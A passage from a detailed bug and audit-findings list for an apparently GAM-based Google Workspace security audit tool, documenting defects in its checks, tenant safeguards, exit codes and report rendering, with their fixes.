- Fix (layered): seed `internal_domains` from the preflight's `primary_domain` so it is never empty after a successful preflight; make every "not in internal" check return `[]` plus a recorded gap (or an INFO "could not judge external sharing") when the list is empty; make `selected_modules` always include `domains` and `domainaliases`; consider adding `domains` to `DELIVERY_CRITICAL_MODULES`.
- Test: every check above with `internal_domains == []`, asserting no external finding and a recorded gap.

### AUD-02 `[x]` A check that raises this run turns last run's findings from that check into "Resolved"
- Done (`4385510`): findings.csv carries a `check` column; a previous finding whose check raised is not compared (any raised check for runs without the column); check-error notes never listed as Resolved.
- Severity High. CONFIRMED (reproduced, including the rendered Resolved list).
- Where: `compare_with_previous` 6059-6067 with `run_checks` 5899-5910.
- What happens: September's run had `ext-forwarding` CRITICAL (modules `forwards;users`). In October `check_external_forwarding` raises (bad row, GAM column change). `run_checks` records `ctx.check_errors` and emits only `check-error-check_external_forwarding`. Both runs have `forwards` and `users` as `ok`, so `comparable()` is True, `ext-forwarding` is not in `current_ids`, and it lands in `summary["resolved"]`. The client report prints it under "What changed" as resolved and the Critical tile reads "down from 1". `compare_with_previous` never consults `ctx.check_errors`, and `findings.csv` does not record which check produced a finding, so it cannot know the finding is missing because the check did not run. The delivery gate does hold the report and exits 2 ("checks did not run"), which is why this is High rather than Critical; the `audit_report.html` on disk is still wrong and the QA verdict does not explain why.
- Related: a previous run's internal `check-error-*` INFO finding (empty modules column) is itself listed as Resolved in the client report once the check works again, because the Resolved list is not severity-filtered (6063-6065) while the New list is.
- Fix: write the producing check name into `findings.csv` (one more column, like `modules`), and in `compare_with_previous` route a previous finding to `not_compared` when its check is in `ctx.check_errors`; as a blunt interim, mark every previous finding `not_compared` whenever `check_errors` is non-empty; filter internal findings out of the Resolved list.
- Test: a check that raises when the previous run had findings from it; assert `not_compared`, not `resolved`.

### AUD-03 `[x]` Licence waste reads seat counts that GAM7 prints for only four legacy SKUs, then reports "Checked and clean" on every other tenant
- Done (`2e1324a`): confirmed on GAM 7.50.00 `CUSTOMER_LICENSE_MAP`; no owned-seat source covers other editions outside the Reseller API, so the check is not listed clean when an assigned paid SKU has no seat line; README says which editions it covers. Open: the Vault secondary (PLAUSIBLE) needs an Enterprise tenant.
- Severity High. CONFIRMED against GAM7 source (`CUSTOMER_LICENSE_MAP`, `__init__.py` 16898-16906, verified by the coordinator).
- Where: `parse_owned_licences` 5583-5596 matches `<name> Licenses: N` lines from `gam info domain`; `check_licence_waste` 5597-5605.
- What happens: GAM's `_showCustomerLicenseInfo` prints only the customer usage report parameters: `G Suite Basic Licenses`, `Workspace Enterprise Plus Licenses`, `G Suite Business Licenses`, `Google Vault Licenses` (plus `... Users` lines). A Business Starter, Business Standard, Business Plus, Enterprise Standard, Frontline, Essentials or Education tenant owning 50 seats with 20 assigned produces no matching line, `owned` is empty, the check returns `[]`, and because it consulted `licenses` (status ok) `run_checks` puts "Licences owned but unassigned" in the client's "Checked and clean" table. The README promises "Licences owned but not assigned (licence waste) [Medium]" without qualification. `test_small_gap_clean` uses a `Business Starter Licenses: 10` line that GAM never emits, which is why the suite passes.
- Secondary (PLAUSIBLE): `Google Vault Licenses: N` from bundled Vault on an Enterprise tenant has no per-user Vault SKU in `licenses.csv`, so Assigned is 0 and with N >= 5 a false "Paying for licences not assigned: Google Vault" row appears.
- Fix: read owned seats from a source that covers every SKU (the Licensing API via `gam print licenses` counts, or the Reports customer usage `accounts:*_total_licenses` parameters where they exist), and never report "clean" when `owned` is empty: say in the finding and the README which editions the seat count covers. GAM also prints `... Users: N` (used seats) for the SKUs it does cover, which can replace the home-grown name matching for those.
- Test: a Business Standard tenant fixture asserting the check is neither flagged nor "clean".

### AUD-04 `[x]` Group-targeted policies are merged into one bucket and reported as org unit "/"
- Done (`a6084b4`): a group policy resolves on its own key, shown as `group:<address>` in the Org unit column (column not renamed).
- Severity High. CONFIRMED against GAM7 source (`policyQuery.orgUnitPath` is set only when `policyQuery.orgUnit` is present, `__init__.py` 39101-39110, verified by the coordinator) and reproduced.
- Where: `_parse_policy_settings` 4310: `ou = str(query.get("orgUnitPath", ""))`.
- What happens: a group-targeted policy carries `policyQuery.groupEmail` instead, so every group policy of one setting type lands in the `(stype, "")` group, is Max-merged across unrelated groups, and every check prints it as `pol["ou"] or "/"`. Reproduced: root `allowEnrollment: true` (sortOrder 201), group contractors `allowEnrollment: false` (301), group execs `allowEnrollment: true` (302) resolved to two rows both labelled `/`, both `true`; the HIGH `2sv-enrolment-blocked` finding for the contractors group never appears. With the sortOrders swapped the block appears but attributed to "/", which a client reads as "nobody can enrol". Every policy check keys on `pol["ou"]` (baseline, password, session, Gmail protections, Takeout, Meet, sharing, service status).
- Fix: key on `orgUnitPath` or `"group:" + groupEmail`, never merge across different targets, label the column "Org unit or group".
- Test: a group-targeted policy fixture (none exists today).

### AUD-05 `[x]` A failed organizer-grant removal followed by one Ctrl+C is never recorded
- Done (`fd47e6e`): the grant is saved as not removed before the removal runs and cleared on success, covering Ctrl+C after a failure and a forced exit mid-removal. Not done: earlier drives' rows are still dropped on interrupt (the module is error, so a resume redoes them); the unused `errors` counter is left.
- Severity High. CONFIRMED (reproduced; loop re-read by the coordinator).
- Where: `collect_sd_external`: `if shutdown_requested: return "error", len(rows), "interrupted"` at 1839-1841 sits above the only place `rows`, `unscanned` and `cleanup_failed` reach disk (1897-1905).
- What happens: with `--grant-temp-access`, drive D1 has no listable member, the admin is granted organizer, the scan runs, `delete drivefileacl` fails (rc 1, `print_error` fires), the operator presses Ctrl+C once as the README invites ("Finishing the current module"). At the top of the next drive the function returns `("error", 0, "interrupted")`. `manifest.meta.temp_grant_cleanup_failed` is never written, `delivery_gate` and `exit_code` never see it, and `qa_report.html` says only that the module did not complete. The tenant carries an organizer grant the tool knows it failed to remove and does not report, which breaks the v1.7.2 promise that the QA report names the drive and the admin to remove. The scanned rows of earlier drives are discarded and a resume redoes them. A second Ctrl+C that lands while `delete drivefileacl` itself is running (`sys.exit(2)` in the handler) also records nothing. The `errors` counter (1763, incremented at 1856, 1870, 1876) is never read.
- Fix: append to `ctx.manifest["meta"]["temp_grant_cleanup_failed"]` and `ctx.save()` inside the `finally` at the moment the removal fails; on the interrupted path still write the rows and the two meta lists before returning.
- Test: Ctrl+C mid-module after a cleanup failure, asserting the manifest names the grant.

### AUD-06 `[x]` Orphaned Shared Drive check misses the common case: every manager suspended
- Done (`f10a8e9`): organizers read from shareddriveacls; a drive with only suspended or archived organizers is flagged, a group organizer counts as a manager. Needs a dev-tenant check that shareddriveacls lists group organizers (the group case was PLAUSIBLE).
- Severity High. CONFIRMED for the suspended case by code reading; the group-only case is PLAUSIBLE.
- Where: `check_orphaned_shared_drives` 2600: `if not col(row, "organizers"):`.
- What happens: the CRITICAL finding fires only when GAM's `organizers` column is empty, i.e. the organizer accounts were deleted. The finding text says the cause is "typically because every manager has left the organisation", but leavers are normally suspended, not deleted, and a suspended user stays a Drive organizer and is still printed by `print shareddriveorganizers`. Such a drive appears only as INFO under `suspended-holding-data` ("manager of Shared Drive"). `shareddriveacls.csv` and `users.csv` (both collected every run) contain everything needed. Secondary: GAM7's `print shareddriveorganizers` defaults to `includetypes user`, so a drive managed only through a Google Group may print an empty `organizers` cell and be flagged CRITICAL "no manager" when it has one; confirm on a tenant.
- Fix: derive orphan status from `shareddriveacls` (role organizer, not deleted, type user with an active non-archived account in `users.csv`, or type group), keep `shareddriveorganizers` as a cross-check, or at least add `includetypes user,group` to the module args.
- Test: a fixture with a drive whose sole organizer is suspended.

### AUD-07 `[x]` Evidence IDs are keyed on a non-unique first column, so the month-to-month diff is blind for most multi-row findings
- Done (`3aab65e`): `EVIDENCE_KEYS` gives one-to-many findings a composite key of stable columns; collision sweep over every finding the suite builds is clean. `sd-open-settings` stays keyed on the drive name (no ID column in its rows).
- Severity High for the feature (two reviewers found it independently), CONFIRMED (reproduced).
- Where: `_evidence_id` 2282-2296 uses the first evidence column of row 0 unless the finding passes `id_field`; only `filter-bec-patterns` (and two findings using `File ID`/`Client ID`) do.
- What happens: two different public files both named "Untitled document" produce identical ids; one file shared with two external people produces two identical ids; a second external member of a Shared Drive (keyed on drive name), a second delegate on an admin mailbox (keyed on Mailbox), a second external group member (Group), a second outsider in a class (Course), a second forwarding filter or send-as for the same user, a second app password on an admin, three Gmail protections off at the same OU, two Takeout services at one OU, one user with three admin roles, all collapse into one id. In `compare_with_previous` (6052-6057) a newly public file with a common name is "persisting", a newly added external member is never "new", a fixed one never counts in `resolved_rows`. Affected ids include `public-files-*`, `anyone-link-*`, `external-domain-shares`, `external-inbound-shares`, `external-user-shares`, `sd-external-members`, `orphaned-shared-drives`, `sd-open-settings`, `sd-download-copy-open`, `delegates-on-admin-mailbox`, `groups-external-members-present`, `classroom-*`, `vault-exports`, `gmail-protections-off`, `meet-safety-open`, `takeout-enabled`, `sd-controls-open`, `2sv-policy-map`, `service-status`, `policy-settings-raw`, `policy-baseline`, `admin-role-map`.
- Why it matters: the README sells "two runs can be diffed by who was named, not just by counts"; for Drive, group, delegation, Shared Drive and policy findings that promise does not hold. IDs are stable so nothing crashes; the diffs are simply blind. `TestCompareWithPrevious` only exercises a "User"-keyed finding.
- Fix: pass `id_field` everywhere a stable key exists (`File ID`, `Drive ID`, `Client ID`), and for one-to-many findings add a hidden composite `Key` column (for example `file_id|shared_with`, `ou|setting`, `user|role`) and point `id_field` at it; or let `_evidence_id` hash the whole row when no `id_field` is given.
- Test: an evidence-id uniqueness assertion over every finding a full fixture produces.

## B2. Medium

### AUD-08 `[x]` A refused `--run-dir` still has the new tenant's data written into it
- Done (`ba0bf69`): both refusals (other customer's run directory, wrong customer for tenants.json) come before any write: no domaininfo.txt, no preflight table or identity in the manifest; the table is printed. The refusal's own error line still reaches the run log, as a record of why it stopped.
- CONFIRMED (reproduced). `preflight` 1265-1283 writes `domaininfo.txt`, saves the preflight table into the manifest, and the log already carries the new tenant's identity lines, before the customer-ID comparison refuses the directory. A later `--render-only --run-dir <customer A's run>` then computes licence waste from customer B's seats against A's `licenses.csv` and prints B's domain in the appendix. This is the cross-customer mixing v1.7.2 set out to prevent. Fix: compare `saved`/`expected` before any write, and print rather than save the preflight table into a refused directory.

### AUD-09 `[x]` `--render-only --run-dir X --tenant Y` is accepted for another customer's run
- Done (`ba0bf69`): one comparison in run_tenant before the tenant's name and break-glass list are applied.
- CONFIRMED (reproduced; two reviewers). `run_tenant` 6798-6809: the customer-ID guard lives only in `preflight`, which `--render-only` skips, although `tenant["customer_id"]` and `manifest.meta.customer_id` are both already in hand. The report header shows Y's name over X's data, Y's break-glass accounts are excluded from X's dormancy findings, and `finish()` saves the manifest so X permanently carries Y's `tenant_name` and `break_glass`. Fix: one comparison before `finish()`.

### AUD-10 `[x]` `--all` cannot produce a deliverable report as documented, and `--admin` is one address for every tenant
- Done (`ba0bf69`): optional `admin` per tenants.json entry, used when --admin is not given; --admin with --all warns; --grant-temp-access with --tenant/--all may take the entry's admin and a tenant with neither is refused. Also: the suite now fences off any installed gam (setUpModule).
- CONFIRMED by logic (coordinator verified `RunContext.admin` at 1049 and the gate at 1738). `tenants.json` has no `admin` field (see `tenants.example.json`) and `run_tenant` never sets a per-tenant admin, so under `--all --yes --no-open` (the module docstring's own example) `collect_sd_external` returns `"skipped", 0, "--admin required for Shared Drive scans"`; `shareddrive_external` is in `DELIVERY_CRITICAL_MODULES`, so every tenant's `qa_report.html` says "Hold for review" and every tenant exits 2. Passing one `--admin` with `--all` makes every other tenant check DWD scopes and impersonate an account that does not exist there. Fix: optional `admin` per tenant entry, used when `--admin` is not given; warn when `--all` is combined with `--admin`.

### AUD-11 `[x]` `load_tenants` accepts shapes that break the hard stop or the break-glass exclusion, and crashes on others
- Done (`0730862`): customer_id, name, gamcfgdir, admin (str), enabled (bool), break_glass (list of str), entry and tenants shapes and folder-safe keys are checked.
- CONFIRMED (reproduced). 6760-6779: `"customer_id": 123` (int) is accepted and then `customer != expected` compares a string with an int, so the wrong-tenant hard stop fires on every run of a correct tenant; `"break_glass": "bg@example.com"` (string) becomes `['b','g','@',...]`, so the break-glass account is reported dormant every month; `"enabled": "false"` (string) is truthy; a top-level array or a string entry raises `AttributeError` (main catches only `ConfigError`); a key such as `"a/../b"` is used verbatim as a path component. Fix: type-check `customer_id` (str), `break_glass` (list of str), `enabled` (bool), `gamcfgdir` (str), and reject keys with path separators.

### AUD-12 `[x]` Forced exit (second Ctrl+C or SIGTERM) exits 2, which the README defines as "complete but some modules could not run"
- Done (`991ab90`): handler exits 130; an --all batch stopped between tenants exits 130; unknown --only/--skip keys are a parser error.
- CONFIRMED (two reviewers; coordinator read the handler). `signal_handler` 449-456 `sys.exit(2)`; README promises 130 for a stopped run so a scheduler can tell complete from stopped. SIGTERM uses the same handler, so a supervisor's double SIGTERM reads as a finished audit with gaps. Also: Ctrl+C before the tenant loop under `--all` returns 0 (6871-6873), and an unknown `--only`/`--skip` key `sys.exit(2)` from `selected_modules` (1167-1170) after a run directory has been created, stopping every tenant under `--all`. Fix: 130 from the handler, `parser.error` for the key typo (validated in `parse_args` before any directory is made).

### AUD-13 `[x]` `manifest.json` is written in place, not atomically
- Done (`4232500`): manifest.json.tmp then os.replace.
- PLAUSIBLE. `RunContext.save` 1085-1089 `write_text` directly; a forced exit, power cut or full disk mid-write yields "manifest.json unreadable; starting a fresh one", losing `customer_id` (so the other-customer refusal cannot fire for that directory) and `complete` (so the run drops out of `earlier_runs`) and re-collecting every module over the old CSVs. `_record`'s own docstring says "save() is not atomic". Fix: write to `manifest.json.tmp` and `os.replace`.

### AUD-14 `[x]` A tamingdns JSON-RPC error or MCP `isError` reply is scored as a passing DNS check
- Done (`78acd0c`): JSON-RPC error, isError, empty and non-verdict replies are {"error": ...}; a domain with only some errored checks marks the module partial (beyond the plan: otherwise those checks were still listed clean).
- CONFIRMED (reproduced with a stubbed `urlopen`). `tamingdns_check` 1959-1967 returns `None` for `{"error": {...}}` and `{"raw": ...}` for `{"result": {"isError": true, ...}}`; neither carries an `"error"` key, so `_dns_domain`'s "every check failed, fall back to DoH" test is false, `collect_dns` marks the module `ok`, and `_dns_check_failed` returns False. A tenant with no DMARC whose DNS calls are rate limited is reported with no DNS finding and the DNS checks under "Checked and clean". Fix: treat `data.get("error")`, `result.get("isError")`, a `None` result and a `{"raw": ...}` result as `{"error": ...}`.

### AUD-15 `[x]` Preflight prints "all N required scopes PASS" when `check serviceaccount` tested nothing
- Done (`653ca58`): NOT VERIFIED with GAM's last line when rc != 0 or any required scope has no PASS. Found on the way: GAM 7.50.00 prints `{scope:73} PASS`, no comma, and the parser required `, PASS`, so a FAIL was never seen; both forms are read now. Owed: confirm the real line shape on a VM.
- CONFIRMED (reproduced). 1333-1352: `run_gam` returning rc 2 with `ERROR: Service Account: oauth2service.json, Does not exist` and no PASS/FAIL lines gives the preflight row "all 2 required scopes PASS" and an empty `failed_scopes`; each DWD module then fails at collect time and the appendix contradicts the module table. Fix: if `rc != 0` or `len(passed) + len(failed) < len(needed)`, record "NOT VERIFIED" with the stderr tail.

### AUD-16 `[x]` A UTF-8 BOM on a CSV header empties the audited user list
- Done (`a697499`): read_csv_rows and _strip_to_header read utf-8-sig with errors replaced; col() ignores a leading BOM for rows parsed from stdout.
- Effect CONFIRMED (reproduced); trigger PLAUSIBLE (gam.cfg `charset = utf-8-sig`, which GAM's docs suggest for Excel users, or a CSV re-saved by Excel in a resumed run directory). `read_csv_rows` 710-714 opens `utf-8`; `col()` 717-734 lowercases keys but `"﻿".strip()` is not empty, so `col(row, "primaryEmail")` returns `""`. `active_users` is empty, `scan_user_list` raises `LookupError`, every per-user module is skipped, "fewer than two super admins" fires. Fix: `encoding="utf-8-sig"` (and `errors="replace"`, as `csv_data_rows` already does) in `read_csv_rows`, `_strip_to_header` and the `csv.DictReader(io.StringIO(out))` sites, or strip `﻿` in `col()`.

### AUD-17 `[x]` Collectors are not wrapped; one exception ends the run with a traceback and no report
- Done (`b30f748`): _run_collector turns an exception into that module's error, traceback in gam_stderr.log.
- Structure CONFIRMED; triggers PLAUSIBLE. `_run_collector` 2160-2163 and `collect` 2222-2247: checks are wrapped (`run_checks`), collectors are not, and `run_tenant` in single-tenant mode has no handler. Realistic triggers: strict UTF-8 decode of a GAM-written redirect file, `OSError` from `write_rows` when the disk fills during a tier-3 scan (the preflight estimate is order-of-magnitude), `csv.Error` on a truncated file after a kill. In the light pool the exception surfaces from `fut.result()` and the remaining futures' results are never recorded. Fix: wrap the call and return `("error", 0, f"{type(exc).__name__}: {exc}")`.

### AUD-18 `[x]` `check_public_files` reports "Checked and clean" with up to 19 "anyone with the link" files present
- Done (`db5e56c`): INFO `anyone-link-*` below the scale (same id as the HIGH).
- CONFIRMED. 2367: below `ANYONE_LINK_SCALE` no finding of any severity is raised, and the check lands on the clean list under "Files public on the web or open to anyone with the link". Nineteen link-shared files, one of them the payroll sheet, read as clean. Fix: INFO finding listing link-shared files below the threshold (HIGH at or above), or reword the title.

### AUD-19 `[x]` `check_unmanaged_accounts` flags accepted and declined invitations as live personal accounts
- Done (`6a31ad5`): ACCEPTED excluded; DECLINED kept (still a live personal account), its state shown.
- CONFIRMED (logic). 2867-2871: every `userinvitations` row becomes HIGH regardless of `state`; the Cloud Identity states are NOT_YET_SENT, INVITED, ACCEPTED, DECLINED, and an ACCEPTED invitation is an account already converted. The test only uses NOT_YET_SENT. Fix: exclude ACCEPTED; consider listing DECLINED separately.

### AUD-20 `[x]` BEC filter heuristic misses `from:` in the query and fires on archive plus the word "account"
- Done (`d99c7cf`): from: terms in the query are senders; account, statement, transfer, urgent need trash or mark-as-read. Not mirrored in m365_scope.py (other repository). The automated review asked to keep transfer and urgent firing on archive alone; kept as planned, raised at ship.
- CONFIRMED (reproduced). `suspicious_filter` 2812-2817: `query from:attacker@outlook.com` plus trash is not flagged because the sender rule reads only the `from` column; `subject Your monthly account statement` plus archive plus label Bank is flagged HIGH "hides mail about 'account'", the routine newsletter-filing pattern the docstring says should be clean; `query label:account-updates` plus archive likewise. Fix: parse `from:` tokens out of the query and apply the sender rule to them; require trash or markread (not archive alone) for the weaker words (`account`, `statement`, `transfer`, `urgent`), keeping archive-alone for `invoice`, `payment`, `remittance`, `wire`, `proof of payment`.

### AUD-21 `[x]` Google's default password minimum (8) is never flagged because `policy_defaults.json` types it as a string
- Done (`aae6bc5`): 8 and 100 as numbers, expiry "0s"; test with no API row.
- CONFIRMED (coordinator verified both files). `policy_defaults.json:185-192` has `"minimumLength": "8"`, `"maximumLength": "100"`, `"expirationDuration": "0"`; `check_password_policy` 4543-4545 requires `isinstance(minlen, int)`. With no `security.password` row in `policies.csv` the resolved root value is the string default and "minimum length is 8 characters" is never reported. `"0"` also does not match `_duration_seconds`'s `(\d+)s` (should be `"0s"`), harmless only because 0 is "never". On tenants where the API returns SYSTEM rows (the dev tenant did) the bug is masked. Fix: integers and `"0s"` in the defaults file; test a `security.password` fixture with no API row.

### AUD-22 `[x]` `policy_defaults.json` carries scrape artefacts and omissions
- Done (`d66584c`): work_data_operation_type rows and the enforcedFrom "Unset" default removed (Google's page, read raw 2026-11-04, names no field for the first and gives "Unset" as prose). Not done: groupsSpoofingVisibilityType, absent from Google's page (ScubaGoggles only), so not added to a file sourced from that page.
- CONFIRMED for the artefacts; omissions PLAUSIBLE. Lines 214-237: eight `work_data_operation_type.*` entries with the field `"true": ""` (no Google setting has a field named `true`); they are appended as real settings at `/`. Line 200: `"enforcedFrom": "Unset"` is prose, not an API value (ScubaGoggles uses `1970-01-01T00:00:00Z`), and leaks into the `2sv-policy-map` INFO card. Lines 164-166: `gmail.spoofing_and_authentication` lacks `groupsSpoofingVisibilityType: "PRIVATE_GROUPS_ONLY"`, which ScubaGoggles includes as Google's default. Every other key/value compared matched ScubaGoggles' defaults.

### AUD-23 `[x]` The "Settings to check by hand" card contradicts the baseline finding in the same report
- Done (`50f133f`): the five settings the baseline judges are off the card; its text says the rest are not judged, not that the API hides them.
- CONFIRMED (reproduced from one fixture). 4831-4901: the INFO card says the API does not expose settings that the same report now judges: automatic forwarding (GWS.GMAIL.11.1), invitations to non-Google accounts (DRIVEDOCS.1.4), general access default (DRIVEDOCS.1.8), Access Checker (DRIVEDOCS.1.6), group creation (GROUPS.2.1), plus external recipient warning, primary-calendar sharing and `externalSharingMode`; POP/IMAP exist as `gmail.imap_access`/`gmail.pop_access`. The list predates v1.7.0 ("checked 2026-09-14"). Fix: drop the rows now covered or reword to "judged above; confirm in the console".

### AUD-24 `[x]` DWD scope parsing splits on commas, but GAM joins multi-valued report parameters with spaces
- Done (`c70c131`): split on whitespace and commas. Still PLAUSIBLE that GAM sends a multiValue; harmless either way.
- PLAUSIBLE (GAM's `' '.join(item['multiValue'])` at 14911 is confirmed; whether `API_SCOPES` arrives as a multiValue could not be confirmed offline). `check_dwd_grants` 5405-5407: a grant of `https://mail.google.com/ https://www.googleapis.com/auth/drive` becomes one unmatched string, "Scopes: 1", "Broad access: none", INFO instead of MEDIUM, the exact grant the check exists for. Zero-cost fix: `re.split(r"[\s,]+", ...)` and a space-joined fixture in the test.

### AUD-25 `[x]` The printed PDF loses the header and every severity label
- Done (`841f220`): print: header dark on white, pills dark text with border and print-color-adjust exact; checked with a headless Chrome print to PDF. STYLE is shared with m365_scope.py, which is not changed.
- PLAUSIBLE (CSS unambiguous; depends on the browser's print-backgrounds setting, which is off by default in Chrome, Edge and Firefox). 6086-6091, 6102-6103, print block 6126-6131: `header.page` and `.sev` pills are white text on background colours; there is no `print-color-adjust: exact` and `@media print` does not recolour them, so the title, customer ID, dates, credit and every CRITICAL/HIGH/MEDIUM/INFO pill print white on white. The README says "Print it for a clean PDF" and the footer says "Print this page for a PDF copy." Fix: `print-color-adjust: exact; -webkit-print-color-adjust: exact;` on those elements, plus a dark-text fallback in `@media print`.

### AUD-26 `[x]` `open_report` can block indefinitely on a headless host with a console browser
- Done (`fa6930d`): no browser on a non-macOS POSIX host without DISPLAY/WAYLAND_DISPLAY.
- PLAUSIBLE (stdlib mechanics confirmed from the 3.13 source). 6736-6753 `webbrowser.open`: with `DISPLAY` unset but `TERM` set, `webbrowser` registers `www-browser`, `links`, `elinks`, `lynx`, `w3m` if present and `GenericBrowser.open` waits on the process. A run started over ssh without `--no-open` opens the report in the terminal browser and waits for `q`, once per tenant under `--all`. Fix: skip opening when neither `DISPLAY` nor `WAYLAND_DISPLAY` is set on Linux, or open in a daemon thread.

## B3. Low

### AUD-27 `[x]` Count-based findings run over a partial (timed-out) `users.csv`
- Done (`4aace1b`): over a partial users module: no few-super-admins, the 2SV finding drops its percentage, the tenant card names the modules whose counts are a minimum.
- CONFIRMED path, rare. `_module_usable` (2300) accepts `partial`; `run_gam` returns partial stdout on timeout and `collect_simple` keeps the rows, so `few-super-admins` CRITICAL, the 2SV percentage and `tenant-shape` can run over an incomplete user list. Mitigated by the delivery gate. Fix: require `ok`/`empty` for count-based findings, or add "(users module partial)" to the title.

### AUD-28 `[x]` `sd-open-settings` and `sd-download-copy-open` go silent when the restriction columns are absent
- Done (`9f64c06`): rows with no restrictions columns record the module as unusable for both checks (`_columns_missing`), so neither is listed clean.
- CONFIRMED behaviour, PLAUSIBLE trigger. 2662: a `shareddrives.csv` without `restrictions.*` columns yields no finding and the check lands on "Checked and clean"; a GAM field change would convert a HIGH finding into a silent clean.

### AUD-29 `[x]` `groups-no-owner` compares group addresses case-sensitively, and a partial `group_members` marks unreached groups ownerless
- Done (`3507ce8`): owners keyed lowercased; over a partial group_members only groups the list reached are judged.
- CONFIRMED logic (3545). GAM normally lower-cases, so this needs a mixed-case group to bite.

### AUD-30 `[-]` `_paid_licences` treats free Essentials Starter as paid
- Rejected: GAM's SKU table (`glskus.py`, read raw 2026-11-04) has no "Essentials Starter" display name; 1010060001 is "Google Workspace Essentials (formerly G Suite Essentials)", which is paid. GAM never prints the string, so the trigger does not exist.
- CONFIRMED (3026): "Google Workspace Essentials Starter" is returned as paid, so such accounts are reported as "still holding a paid licence" or "licensed account never signed into".

### AUD-31 `[x]` Shared Drive rows in the external-share findings cite `mydrive_external.csv` as source
- Done (`cb0471c`): source names shareddrive_external.csv, mydrive_external.csv or both, from the rows' Where column.
- CONFIRMED (2431, 2442); the "full list is in" footer points at a file that does not contain the row.

### AUD-32 `[x]` Passkey column may not exist in the usage report
- Done (`2a923ed`): a column the usage report lacks reads "not reported", is not counted as 0, and keeps the check off the clean list.
- PLAUSIBLE. 3882 reads `accounts:num_passkeys_enrolled` with `or "0"`; if the Reports API does not emit it (`accounts:num_security_keys` is known to exist), every admin without a hardware key is "0 passkeys" and `admins-not-phish-resistant` fires even for passkey-only admins. A missing column should read "not reported" and not count.

### AUD-33 `[x]` Baseline rules looser than the ScubaGoggles rule they cite
- Done (`c4d910a`): the three rules checked against ScubaGoggles' Drive.rego and Commoncontrols.rego (raw, 2026-11-04) and added as INFO rows beside the existing ones; 2sv-policy-map copy fixed. Not done: gating app rules on the service being enabled.
- CONFIRMED against the rego. 4427-4429 GWS.DRIVEDOCS.1.6 flags only `RECIPIENTS_OR_AUDIENCE_OR_PUBLIC` (ScubaGoggles passes only `RECIPIENTS_ONLY`); 4450-4453 DRIVEDOCS.1.4 misses `ALLOWLISTED_DOMAINS` with `allowNonGoogleInvitesInAllowlistedDomains: true`; 4417-4420 COMMONCONTROLS.11.1 does not require `allowAllInternalApps` false. Also app rules are not gated on the service being enabled (ScubaGoggles gates them), and the `2sv-policy-map` copy "Rows only appear where a policy is set" (4636-4641) is wrong since defaults add root rows with no "Set by" column.

### AUD-34 `[x]` Mistyped `--compare-with` is accepted
- Done (`b26cac3`): parser.error when not a directory.
- CONFIRMED (reproduced). `find_previous_run` 6973-6978 and `parse_args` 6692-6695: a non-existent path gives a comparison against nothing ("up from 0", "What changed since typo_dir"). `parser.error` when the path is not a directory.

### AUD-35 `[x]` `--dry-run` still runs `gam oauth info` and `check serviceaccount`
- Done (`b26cac3`): gate 4 is skipped under --dry-run and says so in the table.
- CONFIRMED (1318, 1335). Both are reads, but the README says only `gam version` and `gam info domain` run.

### AUD-36 `[x]` Backup codes do pass through a file on disk, briefly
- Done (`6b3aac6`): wording, README and docstring: never saved to the run directory, passes through GAM's anonymous temporary output file. stdout not piped (a pipe can fill and deadlock run_gam).
- CONFIRMED. `run_gam` 645-649 sends every command's stdout to a `TemporaryFile`, including `print backupcodes`; the collector then keeps only the count. The README's "never reach disk" is stronger than the code. Pipe stdout for that one module or soften the wording.

### AUD-37 `[x]` Light-pass modules that finish after the first Ctrl+C are not recorded
- Done (`1c5a84c`): futures still running after the cancel are recorded when they finish.
- CONFIRMED (2228-2235): after `break` the `with` block waits for running GAM processes but their results never reach `_record`, so they are re-run on resume. Collect the remaining futures before leaving the block.

### AUD-38 `[x]` Archived users are treated as listable Shared Drive members
- Done (`890dd30`): `active` built from `_live_users`.
- CONFIRMED logic (1741-1742 builds `active` from `suspended != true` only); with three tries per drive a drive whose organizers are all archived goes UNSCANNED when an active writer exists. Exclude `archived` as `_live_users` does.

### AUD-39 `[x]` `listed()` treats any "Does not exist" in stderr as the member having no Drive
- Done (`20191da`): a member counts as having no Drive only when a `User: <member>,` skip line names them.
- PLAUSIBLE (1776): a file deleted between the listing and the `select csvfile` call makes GAM print `Does not exist` for that ID; the whole drive is retried as the next member and finally "FAILED mid-scan". Scope the marker to the `User: <member>,` line as `_NO_SERVICE_RE` does.

### AUD-40 `[x]` Classroom module with zero rows and progress lines on stdout reads as partial
- Done (`c54868a`): collect_simple drops stdout ahead of a module's csv_header before judging header-only.
- PLAUSIBLE (1540, 2069-2071): `print classroominvitations` writes "Course: X, Print 0 Classroom Invitations" lines to stdout ahead of the header; with exit 60 `is_header_only(out)` is False, so a healthy Education tenant exits 2.

### AUD-41 `[x]` A stale `shareddriveacls.csv` on resume can turn the temp grant into a membership removal
- Done (`46de5a5`): live `info drivefileacl <drive> <admin> adminaccess formatjson` (syntax from GAM 7.50.00 source) before the grant; a member is scanned with no grant and no removal. Owed: confirm the output on a VM.
- PLAUSIBLE (1861-1893): the "admin is already a direct member" case is excluded only via the previously collected ACL CSV. If the admin was added to the drive between collection and a resumed scan, the `finally` deletes the admin's real membership. Re-read the drive's ACL immediately before granting, or skip the delete when the add reports an existing permission.

### AUD-42 `[x]` Documentation drift
- Done (`6b3bff9`): stacked risk severity and a "what does it connect to" FAQ (update check included). The hold reasons are in Paul's uncommitted README edit, which lacks the domain-list reason. Rejected: "one table per person" is not in the README. The second Ctrl+C exit code is in AUD-12; the test count is updated with the version bump.
- CONFIRMED. README says "283 tests", the docstring says 294, the documented run executes 259 (see AUD-T01). README lists two hold reasons for `qa_report.html`; `delivery_gate` (6519-6540) has four. README says a second Ctrl+C "kills everything" without saying the exit code is 2. README says "Accounts stacking multiple risk factors [High]" but the code is MEDIUM unless an admin is in the list (3249). README does not mention the startup fetch of `raw.githubusercontent.com` (the docstring does). A super admin without 2SV and dormant appears in three findings (admin-no-2sv CRITICAL, dormant-admin HIGH, at-risk HIGH); the code comment accepts this but the README's "one table per person" promise does not.

### Section B review (2026-11-04)
- An independent read-only review of `53ed02a`..`147b58a` found four defects, fixed in `ec2477c`: the AUD-41 membership check read the tool's own unremoved grant as membership, so a resume never removed it (breaking AUD-05's recovery); any failure of that check was read as "not a member"; a failed manifest save before the removal skipped the removal; the AUD-39 member match also matched a per-file line naming the member (GAM 7.50.00 prints a missing selected file as `User: <member>, Drive File/Folder: <id>, Not Found`, so AUD-39's original trigger does not occur there). Also fixed: domaininfo.txt written before the operator confirmed the tenant, `--render-only` refusing a saved customer ID of "?", `,PASS` with no space. Left: earlier drives' rows are still dropped when the Shared Drive scan is interrupted (AUD-05 note).

## B4. Tests

### AUD-T01 `[x]` Thirty-five tests never run under the documented command
